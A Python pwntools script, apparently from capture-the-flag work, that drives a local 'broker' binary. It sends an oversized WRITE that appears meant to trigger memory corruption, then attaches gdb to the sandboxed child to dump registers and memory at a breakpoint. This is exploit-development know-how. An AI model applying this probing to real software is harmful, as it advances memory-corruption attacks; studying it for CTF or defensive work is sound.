#!/usr/bin/env python3
import os
import subprocess
import time

import psutil
from pwn import *


def recv_reply(io):
    return io.recvline(timeout=5) or b""


def child_pid(pid):
    for _ in range(50):
        children = psutil.Process(pid).children(recursive=True)
        if children:
            return children[0].pid
        time.sleep(0.02)
    raise RuntimeError("sandboxee child not found")


def pie_base(pid):
    with open(f"/proc/{pid}/maps") as maps:
        for line in maps:
            fields = line.split()
            if len(fields) >= 6 and fields[-1].endswith("/bin/sandboxee"):
                start = int(fields[0].split("-")[0], 16)
                offset = int(fields[2], 16)
                return start - offset
    raise RuntimeError("sandboxee mapping not found")


def send(io, line):
    io.sendline(line)
    io.stdin.flush()
    reply = recv_reply(io)
    print(reply.decode(errors="replace").rstrip(), flush=True)


def main():
    io = process(
        ["./bin/broker"],
        env={"CTF_STDIO": "1"},
        stdin=PIPE,
        stdout=PIPE,
        stderr=PIPE,
    )
    print(recv_reply(io).decode(errors="replace").rstrip(), flush=True)
    send(io, b"REGISTER alice")
    send(io, b"CREATE x " + b"41" * 33)
    send(io, b"WRITE x " + b"42" * 1000)

    child = child_pid(io.pid)
    base = pie_base(child)
    breakpoint_address = base + 0xAB358
    gdb = subprocess.Popen(
        ["gdb", "-q", "-nx", "-p", str(child)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    commands = f"""set pagination off
set confirm off
b *{breakpoint_address:#x}
commands
silent
printf \"RBp=%p R13=%p R15=%p R12=%u\\n\", $rbp, $r13, $r15, $r12
x/20gx $r13-0x20
x/20gx $r13+0x20
x/20gx $rbp-0x70
continue
end
continue
"""
    gdb.stdin.write(commands)
    gdb.stdin.flush()
    time.sleep(0.5)
    send(io, b"READ x")
    try:
        output, _ = gdb.communicate(timeout=5)
    except subprocess.TimeoutExpired:
        gdb.kill()
        output, _ = gdb.communicate()
    print(output, end="", flush=True)
    io.close()


if __name__ == "__main__":
    main()
